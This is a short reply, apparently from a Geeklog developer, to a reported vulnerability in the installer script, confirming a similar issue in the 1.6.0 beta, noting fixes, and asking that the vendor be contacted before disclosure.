This exact request does not seem to work, but a similar case has already
been reported by someone who called himself Nemesis. I have to admit
that it does still work with the installer for Geeklog 1.6.0 (currently
in beta). We will address that ASAP.

These two have been fixed in the 1.6.0 installer.

A simple solution is to follow the installation instructions, which
strongly recommend removing the install script after a successful
install. There are also further checks and reminders about this built
into Geeklog.

A "Vender contacted" somewhere in between there would have been nice. We
do take security very seriously and we do give proper credits.
